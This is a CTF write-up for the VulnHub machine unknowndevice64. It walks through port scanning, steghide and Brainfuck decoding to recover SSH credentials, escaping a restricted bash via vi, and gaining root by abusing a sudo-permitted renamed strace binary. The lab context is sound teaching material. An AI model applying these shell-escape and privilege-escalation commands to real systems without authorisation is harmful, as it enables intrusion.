---
title:      "Unknowndevice64 writeup"
date:       2019-03-30
tags:       writeup VulnHub
category:   Cybersecurity
comment:    header sizes are 2000x750
header:
  image:    assets/images/2019-03-30-unknowndevice64-writeup/header.jpg
  teaser:   assets/images/2019-03-30-unknowndevice64-writeup/header.jpg
  caption:  "Photo credit: [**Unsplash**](https://unsplash.com)"
---

This is a short and fun machine available on [VulnHub](https://www.vulnhub.com/entry/unknowndevice64-1,293/). The machine has no outdated, vulnerable software, but is set up as a fun CTF challenge with a few intentional configuration mistakes you're supposed to exploit to get a root shell.

This machine was made by [@UnknownDevice64](https://twitter.com/@unknowndevice64).

## Nmap

Let's begin with the usual nmap scan.

```
$ nmap -n -v -Pn -p- -A 10.99.106.42
[...]
PORT      STATE SERVICE VERSION
1337/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 b9:af:04:6d:f1:8c:59:3a:d6:e1:96:b7:f7:fc:57:83 (RSA)
|   256 12:68:4c:6b:96:1e:51:59:32:8a:3d:41:0d:55:6b:d2 (ECDSA)
|_  256 da:3e:28:52:30:72:7a:dd:c3:fb:89:7e:54:f4:bb:fb (ED25519)
31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
|_http-title:    Website By Unknowndevice64
[...]
```
An SSH server running on port 1337 and a Python HTTP server running on port 31337.

If we open a webpage and look at the source code, we see a comment pointing to a
.jpg file.

![Interesting comment in the HTML source code](/assets/images/2019-03-30-unknowndevice64-writeup/1.png)

![PNG file](/assets/images/2019-03-30-unknowndevice64-writeup/2.png)

Let's download it.

## Steghide
It could be hiding something, let's try to extract it. CTF authors love steghide.

```
$ steghide extract -sf key_is_h1dd3n.jpg
Enter passphrase:
wrote extracted data to "h1dd3n.txt".
```

The passphrase seems pretty obvious, `h1dd3n`.

## Brainfuck

```
$ cat h1dd3n.txt
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.-----------------.<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.++++++++++++.>++++++++++++++++++++++++++++++++++++++++.-----------------.
```

This is Brainfuck code. A favourite of CTF challenge creators.

I used [copy.sh](https://copy.sh/brainfuck/) to run and interpret the code. It outputs `ud64:1M!#64@ud`.

## SSH

The colon (`:`) is often used to separate username and password in credentials. Here, `ud64` seems to be the username and `1M!#64@ud` is the password for this user.

Let's try it on the only service we have discovered so far: SSH on port 1337.

```
$ ssh ud64@10.99.106.42 -p 1337
ud64@10.99.106.42's password: 
Last login: Mon Dec 31 08:37:58 2018 from 192.168.56.101
ud64@unknowndevice64_v1:~$
```

Unsurprisingly, it worked.

## Rbash

```
ud64@unknowndevice64_v1:~$ ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
ud64@unknowndevice64_v1:~$ pwd
/home/ud64
ud64@unknowndevice64_v1:~$ cat
-rbash: cat: command not found
ud64@unknowndevice64_v1:~$ ping
-rbash: ping: command not found
ud64@unknowndevice64_v1:~$ cp
-rbash: cp: command not found
ud64@unknowndevice64_v1:~$ wget
-rbash: wget: command not found
ud64@unknowndevice64_v1:~$ curl
-rbash: curl: command not found
```

That's odd. What is `rbash`? A restricted Bash shell? This is going to limit our exploitation capacity, as `rbash` restricts many commonly used commands.

Let's take a closer look

```
ud64@unknowndevice64_v1:~$ env
-rbash: env: command not found
ud64@unknowndevice64_v1:~$ echo $PATH
/home/ud64/prog
ud64@unknowndevice64_v1:~$ echo $SHELL
/bin/rbash
ud64@unknowndevice64_v1:~$ set
BASEDIR=/mnt/sda1
BASH=/bin/rbash
BASHOPTS=cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:hostcomplete:interactive_comments:login_shell:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=()
BASH_ARGV=()
BASH_CMDS=()
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="4" [1]="4" [2]="19" [3]="1" [4]="release" [5]="x86_64-slackware-linux-gnu")
BASH_VERSION='4.4.19(1)-release'
BOOTDEV=/mnt/sda1
COLUMNS=146
CUSER=
DESKTOPS='cinnamon-session lxsession xfce4-session lxqt-session mate-session plasmashell'
DIRSTACK=()
DISTRO=porteus
EUID=1000
FREETYPE_PROPERTIES=truetype:interpreter-version=35
GDK_USE_XFT=1
GROUPS=()
G_BROKEN_FILENAMES=1
G_FILENAME_ENCODING=@locale
HISTFILE=/home/ud64/.bash_history
HISTFILESIZE=500
HISTSIZE=500
HOME=/home/ud64
HOSTNAME=unknowndevice64_v1.0.example.net
HOSTTYPE=x86_64
IFS=$' \t\n'
INPUTRC=/etc/inputrc
LANG=en_US.UTF-8
LC_COLLATE=C
LESS=-M
LESSOPEN='|lesspipe.sh %s'
LINES=53
LOGNAME=ud64
LS_COLORS='no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.bat=01;32:*.BAT=01;32:*.btm=01;32:*.BTM=01;32:*.cmd=01;32:*.CMD=01;32:*.com=01;32:*.COM=01;32:*.dll=01;32:*.DLL=01;32:*.exe=01;32:*.EXE=01;32:*.7z=01;31:*.ace=01;31:*.ACE=01;31:*.arj=01;31:*.bz2=01;31:*.cpio=01;31:*.deb=01;31:*.dz=01;31:*.gz=01;31:*.jar=01;31:*.lha=01;31:*.lz=01;31:*.lzh=01;31:*.lzma=01;31:*.rar=01;31:*.RAR=01;31:*.rpm=01;31:*.rz=01;31:*.tar=01;31:*.taz=01;31:*.tb2=01;31:*.tbz2=01;31:*.tbz=01;31:*.tgz=01;31:*.tlz=01;31:*.trz=01;31:*.txz=01;31:*.tz=01;31:*.tz2=01;31:*.xz=01;31:*.z=01;31:*.Z=01;31:*.zip=01;31:*.ZIP=01;31:*.zoo=01;31:*.aac=01;35:*.AAC=01;35:*.anx=01;35:*.asf=01;35:*.ASF=01;35:*.au=01;35:*.axa=01;35:*.axv=01;35:*.avi=01;35:*.AVI=01;35:*.bmp=01;35:*.BMP=01;35:*.divx=01;35:*.DIVX=01;35:*.flac=01;35:*.FLAC=01;35:*.gif=01;35:*.GIF=01;35:*.ico=01;35:*.ICO=01;35:*.jpg=01;35:*.JPG=01;35:*.jpeg=01;35:*.JPEG=01;35:*.m2a=01;35:*.M2A=01;35:*.m2v=01;35:*.M2V=01;35:*.m4a=01;35:*.M4A=01;35:*.m4p=01;35:*.M4P=01;35:*.m4v=01;35:*.M4V=01;35:*.mid=01;35:*.midi=01;35:*.mka=01;35:*.mkv=01;35:*.MKV=01;35:*.mov=01;35:*.MOV=01;35:*.mp3=01;35:*.MP3=01;35:*.mp4=01;35:*.MP4=01;35:*.mp4v=01;35:*.mpc=01;35:*.MPC=01;35:*.mpeg=01;35:*.MPEG=01;35:*.mpg=01;35:*.MPG=01;35:*.nuv=01;35:*.oga=01;35:*.ogv=01;35:*.ogx=01;35:*.ogg=01;35:*.OGG=01;35:*.opus=01;35:*.OPUS=01;35:*.pbm=01;35:*.pgm=01;35:*.png=01;35:*.PNG=01;35:*.ppm=01;35:*.qt=01;35:*.ra=01;35:*.RA=01;35:*.ram=01;35:*.RAM=01;35:*.rm=01;35:*.RM=01;35:*.spx=01;35:*.svg=01;35:*.svgz=01;35:*.tga=01;35:*.TGA=01;35:*.tif=01;35:*.TIF=01;35:*.tiff=01;35:*.TIFF=01;35:*.vob=01;35:*.VOB=01;35:*.wav=01;35:*.WAV=01;35:*.wma=01;35:*.WMA=01;35:*.wmv=01;35:*.WMV=01;35:*.xbm=01;35:*.xcf=01;35:*.xpm=01;35:*.xspf=01;35:*.xwd=01;35:*.XWD=01;35:*.xvid=01;35:'
LS_OPTIONS='-F -b -T 0 --color=auto'
MACHTYPE=x86_64-slackware-linux-gnu
MAIL=/var/mail/ud64
MAILCHECK=60
MANPATH=/usr/local/man:/usr/man
MINICOM='-c on'
MODDIR=/mnt/sda1/porteus/modules
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/home/ud64/prog
PIPESTATUS=([0]="0")
PORTCFG=/mnt/sda1/porteus/porteus-v4.0-x86_64.cfg
PORTDIR=/mnt/sda1/porteus
PPID=1454
PS1='\[\033[01;31m\]\u@\h:\[\033[01;32m\]\w\$\[\033[00m\] '
PS2='> '
PS4='+ '
PWD=/home/ud64
SHELL=/bin/rbash
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
SHLVL=1
SSH_CLIENT='10.99.9.90 55288 1337'
SSH_CONNECTION='10.99.9.90 55288 10.99.106.42 1337'
SSH_TTY=/dev/pts/0
TERM=xterm-256color
UID=1000
USER=ud64
VDPAU_DRIVER=va_gl
VDPAU_LOG=0
XDG_RUNTIME_DIR=/tmp/xdg-runtime-ud64
_=/bin/rbash
a=plasmashell
ud64@unknowndevice64_v1:~$ export
declare -x BASEDIR="/mnt/sda1"
declare -x BOOTDEV="/mnt/sda1"
declare -x DISPLAY
declare -x DISTRO="porteus"
declare -x FREETYPE_PROPERTIES="truetype:interpreter-version=35"
declare -x GDK_USE_XFT="1"
declare -x G_BROKEN_FILENAMES="1"
declare -x G_FILENAME_ENCODING="@locale"
declare -x HOME="/home/ud64"
declare -x HOSTNAME="unknowndevice64_v1.0.example.net"
declare -x INPUTRC="/etc/inputrc"
declare -x LANG="en_US.UTF-8"
declare -x LC_COLLATE="C"
declare -x LESS="-M"
declare -x LESSOPEN="|lesspipe.sh %s"
declare -x LOGNAME="ud64"
declare -x LS_COLORS="no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.bat=01;32:*.BAT=01;32:*.btm=01;32:*.BTM=01;32:*.cmd=01;32:*.CMD=01;32:*.com=01;32:*.COM=01;32:*.dll=01;32:*.DLL=01;32:*.exe=01;32:*.EXE=01;32:*.7z=01;31:*.ace=01;31:*.ACE=01;31:*.arj=01;31:*.bz2=01;31:*.cpio=01;31:*.deb=01;31:*.dz=01;31:*.gz=01;31:*.jar=01;31:*.lha=01;31:*.lz=01;31:*.lzh=01;31:*.lzma=01;31:*.rar=01;31:*.RAR=01;31:*.rpm=01;31:*.rz=01;31:*.tar=01;31:*.taz=01;31:*.tb2=01;31:*.tbz2=01;31:*.tbz=01;31:*.tgz=01;31:*.tlz=01;31:*.trz=01;31:*.txz=01;31:*.tz=01;31:*.tz2=01;31:*.xz=01;31:*.z=01;31:*.Z=01;31:*.zip=01;31:*.ZIP=01;31:*.zoo=01;31:*.aac=01;35:*.AAC=01;35:*.anx=01;35:*.asf=01;35:*.ASF=01;35:*.au=01;35:*.axa=01;35:*.axv=01;35:*.avi=01;35:*.AVI=01;35:*.bmp=01;35:*.BMP=01;35:*.divx=01;35:*.DIVX=01;35:*.flac=01;35:*.FLAC=01;35:*.gif=01;35:*.GIF=01;35:*.ico=01;35:*.ICO=01;35:*.jpg=01;35:*.JPG=01;35:*.jpeg=01;35:*.JPEG=01;35:*.m2a=01;35:*.M2A=01;35:*.m2v=01;35:*.M2V=01;35:*.m4a=01;35:*.M4A=01;35:*.m4p=01;35:*.M4P=01;35:*.m4v=01;35:*.M4V=01;35:*.mid=01;35:*.midi=01;35:*.mka=01;35:*.mkv=01;35:*.MKV=01;35:*.mov=01;35:*.MOV=01;35:*.mp3=01;35:*.MP3=01;35:*.mp4=01;35:*.MP4=01;35:*.mp4v=01;35:*.mpc=01;35:*.MPC=01;35:*.mpeg=01;35:*.MPEG=01;35:*.mpg=01;35:*.MPG=01;35:*.nuv=01;35:*.oga=01;35:*.ogv=01;35:*.ogx=01;35:*.ogg=01;35:*.OGG=01;35:*.opus=01;35:*.OPUS=01;35:*.pbm=01;35:*.pgm=01;35:*.png=01;35:*.PNG=01;35:*.ppm=01;35:*.qt=01;35:*.ra=01;35:*.RA=01;35:*.ram=01;35:*.RAM=01;35:*.rm=01;35:*.RM=01;35:*.spx=01;35:*.svg=01;35:*.svgz=01;35:*.tga=01;35:*.TGA=01;35:*.tif=01;35:*.TIF=01;35:*.tiff=01;35:*.TIFF=01;35:*.vob=01;35:*.VOB=01;35:*.wav=01;35:*.WAV=01;35:*.wma=01;35:*.WMA=01;35:*.wmv=01;35:*.WMV=01;35:*.xbm=01;35:*.xcf=01;35:*.xpm=01;35:*.xspf=01;35:*.xwd=01;35:*.XWD=01;35:*.xvid=01;35:"
declare -x LS_OPTIONS="-F -b -T 0 --color=auto"
declare -x MAIL="/var/mail/ud64"
declare -x MANPATH="/usr/local/man:/usr/man"
declare -x MINICOM="-c on"
declare -x MODDIR="/mnt/sda1/porteus/modules"
declare -x OLDPWD
declare -rx PATH="/home/ud64/prog"
declare -x PORTCFG="/mnt/sda1/porteus/porteus-v4.0-x86_64.cfg"
declare -x PORTDIR="/mnt/sda1/porteus"
declare -x PS1="\\[\\033[01;31m\\]\\u@\\h:\\[\\033[01;32m\\]\\w\\\$\\[\\033[00m\\] "
declare -x PS2="> "
declare -x PWD="/home/ud64"
declare -rx SHELL="/bin/rbash"
declare -x SHLVL="1"
declare -x SSH_CLIENT="10.99.9.90 55288 1337"
declare -x SSH_CONNECTION="10.99.9.90 55288 10.99.106.42 1337"
declare -x SSH_TTY="/dev/pts/0"
declare -x TERM="xterm-256color"
declare -x USER="ud64"
declare -x VDPAU_DRIVER="va_gl"
declare -x VDPAU_LOG="0"
declare -x XDG_RUNTIME_DIR="/tmp/xdg-runtime-ud64"
```

Unfortunately, environment variables seem to be read only.

```
ud64@unknowndevice64_v1:~$ export PATH=/bin:/usr/bin:$PATH
-rbash: PATH: readonly variable
ud64@unknowndevice64_v1:~$ export SHELL=/bin/sh
-rbash: SHELL: readonly variable
```

But we can run the Vi text editor. Once in the editor, we can type `:!/bin/sh` and it will grant us an unrestricted shell.

```
sh-4.4$ id
uid=1000(ud64) gid=1000(ud64) groups=1000(ud64)
sh-4.4$ whoami
ud64
sh-4.4$ export PATH=/bin:/usr/bin:$PATH
sh-4.4$ ls -A
.bash_history  .bash_profile  .config  .screenrc  Desktop  Documents  Downloads  Music	Pictures  Public  Videos  prog	web
```

Now, using the [LinEnum.sh script](https://github.com/rebootuser/LinEnum), there's an interesting file that may be worth checking out.

```
[...]
[+] We can sudo without supplying a password!
User ud64 may run the following commands on unknowndevice64_v1:
    (ALL) NOPASSWD: /usr/bin/sysud64
[...]
```

But what is `sysud64`?

```
bash-4.4$ sysud64
sysud64: must have PROG [ARGS] or -p PID
Try 'sysud64 -h' for more information.
bash-4.4$ sysud64 -h
usage: strace [-CdffhiqrtttTvVwxxy] [-I n] [-e expr]...
              [-a column] [-o file] [-s strsize] [-P path]...
              -p pid... / [-D] [-E var=val]... [-u username] PROG [ARGS]
   or: strace -c[dfw] [-I n] [-e expr]... [-O overhead] [-S sortby]
              -p pid... / [-D] [-E var=val]... [-u username] PROG [ARGS]
[...]
```

It seems to be a renamed `strace` binary. [This page](http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/) has a few tips on abusing `sudo`. `strace` is one way. Here's how:

```
bash-4.4$ sudo sysud64 -o/dev/null /bin/bash
root@unknowndevice64_v1:/home/ud64# whoami
root
```

And we're in with a root shell!

```
root@unknowndevice64_v1:~# cat flag.txt
<FLAG>
```
